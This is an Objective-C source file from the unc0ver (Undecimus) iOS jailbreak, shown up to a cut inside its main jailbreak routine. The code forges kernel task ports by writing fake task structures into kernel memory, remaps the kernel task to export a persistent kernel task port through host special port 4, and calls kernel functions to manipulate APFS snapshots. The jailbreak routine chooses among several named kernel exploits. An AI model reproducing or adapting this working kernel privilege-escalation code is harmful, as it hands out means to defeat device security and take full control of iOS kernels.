//
//  JailbreakViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 - 2019 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <common.h>
#include <iokit.h>
#include <NSTask.h>
#include <MobileGestalt.h>
#include <netdb.h>
#include <reboot.h>
#import <snappy.h>
#import <inject.h>
#include <sched.h>
#import <patchfinder64.h>
#import <offsetcache.h>
#import <kerneldec.h>
#import "JailbreakViewController.h"
#include "KernelStructureOffsets.h"
#include "KernelMemory.h"
#include "KernelExecution.h"
#include "KernelUtilities.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "async_wake.h"
#include "utils.h"
#include "ArchiveFile.h"
#include "CreditsTableViewController.h"
#include "FakeApt.h"
#include "voucher_swap.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "find_port.h"
#include "machswap_offsets.h"
#include "machswap_pwn.h"
#include "machswap2_pwn.h"

@interface NSUserDefaults ()
- (id)objectForKey:(id)arg1 inDomain:(id)arg2;
- (void)setObject:(id)arg1 forKey:(id)arg2 inDomain:(id)arg3;
@end

@interface JailbreakViewController ()

@end

@implementation JailbreakViewController
static JailbreakViewController *sharedController = nil;
static NSMutableString *output = nil;

#define STATUS(msg, btnenbld, tbenbld) do { \
LOG("STATUS: %@", msg); \
dispatch_async(dispatch_get_main_queue(), ^{ \
[UIView performWithoutAnimation:^{ \
[[[JailbreakViewController sharedController] goButton] setEnabled:btnenbld]; \
[[[[JailbreakViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
[[[JailbreakViewController sharedController] goButton] setTitle:msg forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
[[[JailbreakViewController sharedController] goButton] layoutIfNeeded]; \
}]; \
}); \
} while (false)

int stage = __COUNTER__;
extern int maxStage;

#define STATUSWITHSTAGE(Stage, MaxStage) STATUS(([NSString stringWithFormat:@"%@ (%d/%d)", NSLocalizedString(@"Exploiting", nil), Stage, MaxStage]), false, false)
#define UPSTAGE() do { \
__COUNTER__; \
stage++; \
STATUSWITHSTAGE(stage, maxStage); \
} while (false)

typedef struct {
    bool load_tweaks;
    bool load_daemons;
    bool dump_apticket;
    bool run_uicache;
    const char *boot_nonce;
    bool disable_auto_updates;
    bool disable_app_revokes;
    bool overwrite_boot_nonce;
    bool export_kernel_task_port;
    bool restore_rootfs;
    bool increase_memory_limit;
    bool install_cydia;
    bool install_sileo;
    bool install_openssh;
    bool reload_system_daemons;
    bool reset_cydia_cache;
    bool ssh_only;
    bool enable_get_task_allow;
    bool set_cs_debugged;
    int exploit;
} prefs_t;

#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]

static NSString *bundledResources = nil;

#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

static void writeTestFile(const char *file) {
    _assert(create_file(file, 0, 0644), message, true);
    _assert(clean_file(file), message, true);
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            LOG("found at: %llx", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = get_address_of_port(getpid(), port);
    
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

void set_all_image_info_addr(uint64_t kernel_task_kaddr) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will save offsets to all_image_info_addr");
    SETOFFSET(kernel_task_offset_all_image_info_addr, koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR));
    if (dyld_info.all_image_info_addr && dyld_info.all_image_info_addr != kernel_base && dyld_info.all_image_info_addr > kernel_base) {
        size_t blob_size = rk64(dyld_info.all_image_info_addr);
        struct cache_blob *blob = create_cache_blob(blob_size);
        _assert(rkbuffer(dyld_info.all_image_info_addr, blob, blob_size), message, true);
        // Adds any entries that are in kernel but we don't have
        merge_cache_blob(blob);
        free(blob);
        
        // Free old offset cache - didn't bother comparing because it's faster to just replace it if it's the same
        kmem_free(dyld_info.all_image_info_addr, blob_size);
    }
    struct cache_blob *cache;
    size_t cache_size = export_cache_blob(&cache);
    _assert(cache_size > sizeof(struct cache_blob), message, true);
    LOG("Setting all_image_info_addr...");
    uint64_t kernel_cache_blob = kmem_alloc_wired(cache_size);
    blob_rebase(cache, (uint64_t)cache, kernel_cache_blob);
    wkbuffer(kernel_cache_blob, cache, cache_size);
    free(cache);
    WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), kernel_cache_blob);
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    _assert(dyld_info.all_image_info_addr == kernel_cache_blob, message, true);
}

void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_size to: " ADDR, all_image_info_size);
    if (dyld_info.all_image_info_size != all_image_info_size) {
        LOG("Setting all_image_info_size...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
    } else {
        LOG("All_image_info_size already set.");
    }
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
void remap_tfp0_set_hsp4(mach_port_t *port) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    host_t host = mach_host_self();
    _assert(MACH_PORT_VALID(host), message, true);
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    uint64_t kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
    _assert(kernel_task_kaddr != 0, message, true);
    LOG("kernel_task_kaddr = " ADDR, kernel_task_kaddr);
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
    }
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
    uint64_t zone_map = ReadKernel64(zone_map_kptr);
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    km_fake_task_port = zm_fake_task_port;
    vm_prot_t cur = 0;
    vm_prot_t max = 0;
    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, message, true);
    _assert(kernel_task_kaddr != remapped_task_addr, message, true);
    LOG("remapped_task_addr = " ADDR, remapped_task_addr);
    _assert(mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
    LOG("port_kaddr = " ADDR, port_kaddr);
    make_port_fake_task_port(*port, remapped_task_addr);
    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
    // lck_mtx -- arm: 8  arm64: 16
    uint64_t host_priv_kaddr = get_address_of_port(getpid(), host);
    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void *), port_kaddr);
    set_all_image_info_addr(kernel_task_kaddr);
    set_all_image_info_size(kernel_task_kaddr, kernel_slide);
    mach_port_deallocate(mach_task_self(), host);
}

void blockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to block domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if (![hostsFile containsString:newLine]) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if (![hostsFile containsString:newLine]) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

void unblockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to unblock domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0    %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile containsString:newLine]) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

uint64_t _vfs_context() {
    static uint64_t vfs_context = 0;
    if (vfs_context == 0) {
        vfs_context = kexecute(GETOFFSET(vfs_context_current), 1, 0, 0, 0, 0, 0, 0);
        vfs_context = zm_fix_addr(vfs_context);
    }
    return vfs_context;
}

int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(GETOFFSET(vnode_lookup), ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != ERR_SUCCESS) {
        return -1;
    }
    *vpp = ReadKernel64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode){
    return (int)kexecute(GETOFFSET(vnode_put), vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t vnodeForPath(const char *path) {
    uint64_t vfs_context = 0;
    uint64_t *vpp = NULL;
    uint64_t vnode = 0;
    vfs_context = _vfs_context();
    if (!ISADDR(vfs_context)) {
        LOG("Failed to get vfs_context.");
        goto out;
    }
    vpp = malloc(sizeof(uint64_t));
    if (vpp == NULL) {
        LOG("Failed to allocate memory.");
        goto out;
    }
    if (_vnode_lookup(path, O_RDONLY, vpp, vfs_context) != ERR_SUCCESS) {
        LOG("Failed to get vnode at path \"%s\".", path);
        goto out;
    }
    vnode = *vpp;
    out:
    if (vpp != NULL) {
        free(vpp);
        vpp = NULL;
    }
    return vnode;
}

uint64_t vnodeForSnapshot(int fd, char *name) {
    uint64_t rvpp_ptr = 0;
    uint64_t sdvpp_ptr = 0;
    uint64_t ndp_buf = 0;
    uint64_t vfs_context = 0;
    uint64_t sdvpp = 0;
    uint64_t sdvpp_v_mount = 0;
    uint64_t sdvpp_v_mount_mnt_data = 0;
    uint64_t snap_meta_ptr = 0;
    uint64_t old_name_ptr = 0;
    uint32_t ndp_old_name_len = 0;
    uint64_t ndp_old_name = 0;
    uint64_t snap_meta = 0;
    uint64_t snap_vnode = 0;
    rvpp_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("rvpp_ptr = " ADDR, rvpp_ptr);
    if (!ISADDR(rvpp_ptr)) {
        goto out;
    }
    sdvpp_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("sdvpp_ptr = " ADDR, sdvpp_ptr);
    if (!ISADDR(sdvpp_ptr)) {
        goto out;
    }
    ndp_buf = kmem_alloc(816);
    LOG("ndp_buf = " ADDR, ndp_buf);
    if (!ISADDR(ndp_buf)) {
        goto out;
    }
    vfs_context = _vfs_context();
    LOG("vfs_context = " ADDR, vfs_context);
    if (!ISADDR(vfs_context)) {
        goto out;
    }
    if (kexecute(GETOFFSET(vnode_get_snapshot), fd, rvpp_ptr, sdvpp_ptr, (uint64_t)name, ndp_buf, 2, vfs_context) != ERR_SUCCESS) {
        goto out;
    }
    sdvpp = ReadKernel64(sdvpp_ptr);
    LOG("sdvpp = " ADDR, sdvpp);
    if (!ISADDR(sdvpp)) {
        goto out;
    }
    sdvpp_v_mount = ReadKernel64(sdvpp + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
    LOG("sdvpp_v_mount = " ADDR, sdvpp_v_mount);
    if (!ISADDR(sdvpp_v_mount)) {
        goto out;
    }
    sdvpp_v_mount_mnt_data = ReadKernel64(sdvpp_v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_DATA));
    LOG("sdvpp_v_mount_mnt_data = " ADDR, sdvpp_v_mount_mnt_data);
    if (!ISADDR(sdvpp_v_mount_mnt_data)) {
        goto out;
    }
    snap_meta_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("snap_meta_ptr = " ADDR, snap_meta_ptr);
    if (!ISADDR(snap_meta_ptr)) {
        goto out;
    }
    old_name_ptr = kmem_alloc(sizeof(uint64_t));
    LOG("old_name_ptr = " ADDR, old_name_ptr);
    if (!ISADDR(old_name_ptr)) {
        goto out;
    }
    ndp_old_name_len = ReadKernel32(ndp_buf + 336 + 48);
    LOG("ndp_old_name_len = 0x%x", ndp_old_name_len);
    ndp_old_name = ReadKernel64(ndp_buf + 336 + 40);
    LOG("ndp_old_name = " ADDR, ndp_old_name);
    if (!ISADDR(ndp_old_name)) {
        goto out;
    }
    if (kexecute(GETOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name), sdvpp_v_mount_mnt_data, ndp_old_name, ndp_old_name_len, snap_meta_ptr, old_name_ptr, 0, 0) != ERR_SUCCESS) {
        goto out;
    }
    snap_meta = ReadKernel64(snap_meta_ptr);
    LOG("snap_meta = " ADDR, snap_meta);
    if (!ISADDR(snap_meta)) {
        goto out;
    }
    snap_vnode = kexecute(GETOFFSET(apfs_jhash_getvnode), sdvpp_v_mount_mnt_data, ReadKernel32(sdvpp_v_mount_mnt_data + 440), ReadKernel64(snap_meta + 8), 1, 0, 0, 0);
    snap_vnode = zm_fix_addr(snap_vnode);
    LOG("snap_vnode = " ADDR, snap_vnode);
    if (!ISADDR(snap_vnode)) {
        goto out;
    }
    out:
    if (ISADDR(sdvpp)) {
        _vnode_put(sdvpp);
    }
    if (ISADDR(sdvpp_ptr)) {
        kmem_free(sdvpp_ptr, sizeof(uint64_t));
    }
    if (ISADDR(ndp_buf)) {
        kmem_free(ndp_buf, 816);
    }
    if (ISADDR(snap_meta_ptr)) {
        kmem_free(snap_meta_ptr, sizeof(uint64_t));
    }
    if (ISADDR(old_name_ptr)) {
        kmem_free(old_name_ptr, sizeof(uint64_t));
    }
    return snap_vnode;
}

double uptime() {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = { CTL_KERN, KERN_BOOTTIME };
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        return -1.0;
    }
    time_t bsec = boottime.tv_sec, csec = time(NULL);
    return difftime(csec, bsec);
}

int waitForFile(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == ERR_SUCCESS); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}

NSString *hexFromInt(NSInteger val) {
    return [NSString stringWithFormat:@"0x%lX", (long)val];
}

bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
    if (prefs == NULL) {
        return false;
    }
    prefs->load_tweaks = [defaults[K_TWEAK_INJECTION] boolValue];
    prefs->load_daemons = [defaults[K_LOAD_DAEMONS] boolValue];
    prefs->dump_apticket = [defaults[K_DUMP_APTICKET] boolValue];
    prefs->run_uicache = [defaults[K_REFRESH_ICON_CACHE] boolValue];
    prefs->boot_nonce = [defaults[K_BOOT_NONCE] UTF8String];
    prefs->disable_auto_updates = [defaults[K_DISABLE_AUTO_UPDATES] boolValue];
    prefs->disable_app_revokes = [defaults[K_DISABLE_APP_REVOKES] boolValue];
    prefs->overwrite_boot_nonce = [defaults[K_OVERWRITE_BOOT_NONCE] boolValue];
    prefs->export_kernel_task_port = [defaults[K_EXPORT_KERNEL_TASK_PORT] boolValue];
    prefs->restore_rootfs = [defaults[K_RESTORE_ROOTFS] boolValue];
    prefs->increase_memory_limit = [defaults[K_INCREASE_MEMORY_LIMIT] boolValue];
    prefs->install_cydia = [defaults[K_INSTALL_CYDIA] boolValue];
    prefs->install_sileo = [defaults[K_INSTALL_SILEO] boolValue];
    prefs->install_openssh = [defaults[K_INSTALL_OPENSSH] boolValue];
    prefs->reload_system_daemons = [defaults[K_RELOAD_SYSTEM_DAEMONS] boolValue];
    prefs->reset_cydia_cache = [defaults[K_RESET_CYDIA_CACHE] boolValue];
    prefs->ssh_only = [defaults[K_SSH_ONLY] boolValue];
    prefs->enable_get_task_allow = [defaults[K_ENABLE_GET_TASK_ALLOW] boolValue];
    prefs->set_cs_debugged = [defaults[K_SET_CS_DEBUGGED] boolValue];
    prefs->exploit = [defaults[K_EXPLOIT] intValue];
    return true;
}

void waitFor(int seconds) {
    for (int i = 1; i <= seconds; i++) {
        LOG("Waiting (%d/%d)", i, seconds);
        sleep(1);
    }
}

static void *load_bytes(FILE *obj_file, off_t offset, uint32_t size) {
    void *buf = calloc(1, size);
    fseek(obj_file, offset, SEEK_SET);
    fread(buf, size, 1, obj_file);
    return buf;
}

uint32_t find_macho_header(FILE *file) {
    uint32_t off = 0;
    uint32_t *magic = load_bytes(file, off, sizeof(uint32_t));
    while ((*magic & ~1) != 0xFEEDFACE) {
        off++;
        magic = load_bytes(file, off, sizeof(uint32_t));
    }
    return off - 1;
}

void jailbreak()
{
    int rv = 0;
    bool usedPersistedKernelTaskPort = false;
    pid_t myPid = getpid();
    uid_t myUid = getuid();
    host_t myHost = HOST_NULL;
    host_t myOriginalHost = HOST_NULL;
    uint64_t myProcAddr = 0;
    uint64_t myOriginalCredAddr = 0;
    uint64_t myCredAddr = 0;
    uint64_t kernelCredAddr = 0;
    uint64_t Shenanigans = 0;
    prefs_t prefs;
    bool needStrap = false;
    bool needSubstrate = false;
    bool skipSubstrate = false;
    bool updatedResources = false;
    NSUserDefaults *userDefaults = nil;
    NSDictionary *userDefaultsDictionary = nil;
    NSString *prefsFile = nil;
    NSString *homeDirectory = NSHomeDirectory();
    NSString *temporaryDirectory = NSTemporaryDirectory();
    NSMutableArray *debsToInstall = [NSMutableArray new];
    NSMutableString *status = [NSMutableString string];
    bool betaFirmware = false;
    time_t start_time = time(NULL);
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *substrateDeb = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"mobilesubstrate.deb"]];
    NSString *electraPackages = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"Packages"]];
    NSString *sileoDeb = [documentsDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"sileo.deb"]];
#define INSERTSTATUS(x) do { \
[status appendString:x]; \
} while (false)
    
    UPSTAGE();
    
    {
        // Load preferences.
        
        LOG("Loading preferences...");
        SETMESSAGE(NSLocalizedString(@"Failed to load preferences.", nil));
        NSString *user = @"mobile";
        userDefaults = [[NSUserDefaults alloc] initWithUser:user];
        userDefaultsDictionary = [userDefaults dictionaryRepresentation];
        NSBundle *bundle = [NSBundle mainBundle];
        NSDictionary *infoDictionary = [bundle infoDictionary];
        NSString *bundleIdentifierKey = @"CFBundleIdentifier";
        NSString *bundleIdentifier = [infoDictionary objectForKey:bundleIdentifierKey];
        prefsFile = [NSString stringWithFormat:@"%@/Library/Preferences/%@.plist", homeDirectory, bundleIdentifier];
        bzero(&prefs, sizeof(prefs));
        _assert(load_prefs(&prefs, userDefaultsDictionary), message, true);
        LOG("Successfully loaded preferences.");
    }
    
    UPSTAGE();
    
    {
        // Exploit kernel_task.
        
        LOG("Exploiting kernel_task...");
        SETMESSAGE(NSLocalizedString(@"Failed to exploit kernel_task.", nil));
        bool exploit_success = false;
        mach_port_t persisted_kernel_task_port = MACH_PORT_NULL;
        struct task_dyld_info dyld_info = { 0 };
        mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
        uint64_t persisted_cache_blob = 0;
        uint64_t persisted_kernel_slide = 0;
        myHost = mach_host_self();
        _assert(MACH_PORT_VALID(myHost), message, true);
        myOriginalHost = myHost;
        pid_t pid = 0;
        if ((task_for_pid(mach_task_self(), 0, &persisted_kernel_task_port) == KERN_SUCCESS ||
             host_get_special_port(myHost, 0, 4, &persisted_kernel_task_port) == KERN_SUCCESS) &&
            MACH_PORT_VALID(persisted_kernel_task_port) &&
            pid_for_task(persisted_kernel_task_port, &pid) == KERN_SUCCESS && pid == 0 &&
            task_info(persisted_kernel_task_port, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS &&
            ISADDR((persisted_cache_blob = dyld_info.all_image_info_addr)) &&
            (persisted_kernel_slide = dyld_info.all_image_info_size) != -1) {
            prepare_for_rw_with_fake_tfp0(persisted_kernel_task_port);
            kernel_base = KERNEL_SEARCH_ADDRESS + persisted_kernel_slide;
            kernel_slide = persisted_kernel_slide;
            
            if (persisted_cache_blob != KERNEL_SEARCH_ADDRESS + persisted_kernel_slide) {
                size_t blob_size = rk64(persisted_cache_blob);
                LOG("Restoring persisted offsets cache");
                struct cache_blob *blob = create_cache_blob(blob_size);
                _assert(rkbuffer(persisted_cache_blob, blob, blob_size), message, true);
                import_cache_blob(blob);
                free(blob);
                _assert(GETOFFSET(kernel_slide) == persisted_kernel_slide, message, true);
                found_offsets = true;
            }
            
            usedPersistedKernelTaskPort = true;
            exploit_success = true;
        } else {
            switch (prefs.exploit) {
                case async_wake_exploit: {
                    if (async_wake_go() &&
                        MACH_PORT_VALID(tfp0) &&
                        ISADDR(kernel_base = find_kernel_base())) {
                        exploit_success = true;
                    }
                    break;
                }
                case voucher_swap_exploit: {
                    voucher_swap();
                    prepare_for_rw_with_fake_tfp0(kernel_task_port);
                    if (MACH_PORT_VALID(tfp0) &&
                        kernel_slide_init() &&
                        kernel_slide != -1 &&
                        ISADDR(kernel_base = (kernel_slide + KERNEL_SEARCH_ADDRESS))) {
                        exploit_success = true;
                    }
                    break;
                }
                case mach_swap_exploit: {
                    machswap_offsets_t *machswap_offsets = NULL;
                    if ((machswap_offsets = get_machswap_offsets()) != NULL &&
                        machswap_exploit(machswap_offsets) == ERR_SUCCESS &&
                        MACH_PORT_VALID(tfp0) &&
                        ISADDR(kernel_base)) {
                        exploit_success = true;
                    }
                    break;
                }
                case mach_swap_2_exploit: {
                    machswap_offsets_t *machswap_offsets = NULL;
                    if ((machswap_offsets = get_machswap_offsets()) != NULL &&
                        machswap2_exploit(machswap_offsets) == ERR_SUCCESS &&
                        MACH_PORT_VALID(tfp0) &&
                        ISADDR(kernel_base)) {
                        exploit_success = true;
                    }
                    break;
                }
                default: {
